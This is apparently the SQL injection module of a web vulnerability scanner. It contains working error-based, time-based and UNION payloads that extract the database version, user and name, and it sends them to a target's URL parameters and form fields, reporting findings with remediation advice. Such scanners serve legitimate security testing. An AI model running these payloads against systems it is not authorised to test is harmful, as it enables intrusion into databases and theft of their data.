import re
import time

from modules.base import BaseModule


class SqliModule(BaseModule):
    NAME = "sqli"
    DESCRIPTION = "SQL Injection testing - error, boolean-blind, time-based, union"
    ERROR_PAYLOADS = [
        "'",
        "''",
        "`",
        '"',
        "\\",
        "')",
        "') OR ('1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "' OR 1=1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 100--",
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))",
        "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,0x3a,FLOOR(RAND(0)*2))x "
        "FROM information_schema.tables GROUP BY x)a)",
    ]

    BOOLEAN_PAYLOADS = [
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("1 AND 1=1--", "1 AND 1=2--"),
    ]

    TIME_PAYLOADS = [
        "1; WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "1 AND SLEEP(5)--",
        "1'; SELECT pg_sleep(5)--",
        "1 AND 1=(SELECT 1 FROM pg_sleep(5))--",
    ]

    UNION_PAYLOADS = [
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "1 UNION SELECT 1,@@version,3--",
        "1 UNION SELECT 1,user(),3--",
        "1 UNION SELECT 1,database(),3--",
    ]

    DB_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"ORA-\d{5}", r"Oracle.*ORA-",
        r"PostgreSQL.*ERROR", r"PSQLException",
        r"SQLite.*Exception", r"SQLite3::",
        r"Microsoft.*SQL.*Server", r"ODBC.*SQL Server",
        r"Unclosed quotation mark", r"SqlException",
        r"Syntax error.*in query", r"mysql_fetch",
        r"SQLITE_ERROR", r"sqlite3.OperationalError",
    ]

    COMMON_PARAMS = ["id", "user", "search", "q", "query", "page", "cat",
                     "item", "product", "lang", "ref", "order", "sort"]

    def run(self):
        self.log.info("[sqli] Probing SQL injection vectors")
        self._test_url_params()
        self._test_form_params()

    def _test_url_params(self):
        for param in self.COMMON_PARAMS:
            base_url = f"{self.target}/index.php"
            self._run_error_tests(base_url, param)
            self._run_time_tests(base_url, param)
            self._run_union_tests(base_url, param)

    def _test_form_params(self):
        """Discover forms in the homepage and test their inputs."""
        resp = self.get(self.target)
        if not resp:
            return
        actions = re.findall(r'<form[^>]+action=["\']([^"\']*)["\']', resp.text, re.I)
        inputs  = re.findall(r'<input[^>]+name=["\']([^"\']*)["\']', resp.text, re.I)

        for action in actions[:5]:
            for name in inputs[:10]:
                self._run_error_tests(self.url(action), name, method="POST")

    def _run_error_tests(self, url: str, param: str, method: str = "GET"):
        for payload in self.ERROR_PAYLOADS:
            resp = self._inject(url, param, payload, method)
            if resp and self._is_error(resp.text):
                self.add_finding(
                    severity="HIGH",
                    title="SQL Injection - Error-based",
                    url=url,
                    detail=f"Parameter '{param}' reflects a DB error.",
                    payload=payload,
                    evidence=self._extract_error(resp.text),
                    remediation="Use parameterised queries / prepared statements.",
                )
                return

    def _run_time_tests(self, url: str, param: str, method: str = "GET"):
        for payload in self.TIME_PAYLOADS:
            start = time.time()
            resp = self._inject(url, param, payload, method)
            elapsed = time.time() - start
            if resp and elapsed >= 4.5:
                self.add_finding(
                    severity="HIGH",
                    title="SQL Injection - Time-based blind",
                    url=url,
                    detail=f"Parameter '{param}' caused {elapsed:.1f}s delay.",
                    payload=payload,
                    remediation="Use parameterised queries / prepared statements.",
                )
                return

    def _run_union_tests(self, url: str, param: str, method: str = "GET"):
        for payload in self.UNION_PAYLOADS:
            resp = self._inject(url, param, payload, method)
            if resp and ("@@version" in resp.text or re.search(r"\d+\.\d+\.\d+", resp.text)):
                self.add_finding(
                    severity="CRITICAL",
                    title="SQL Injection - UNION-based (version leak)",
                    url=url,
                    detail=f"Parameter '{param}' returned DB version via UNION.",
                    payload=payload,
                    evidence=resp.text[:300],
                    remediation="Use parameterised queries / prepared statements.",
                )
                return

    def _inject(self, url, param, payload, method):
        if method == "GET":
            return self.get(url, params={param: payload})
        return self.post(url, data={param: payload})

    def _is_error(self, body: str) -> bool:
        return any(re.search(p, body, re.I) for p in self.DB_ERROR_PATTERNS)

    def _extract_error(self, body: str) -> str:
        for pat in self.DB_ERROR_PATTERNS:
            m = re.search(pat, body, re.I)
            if m:
                start = max(0, m.start() - 30)
                return body[start:m.end() + 80].strip()
        return ""
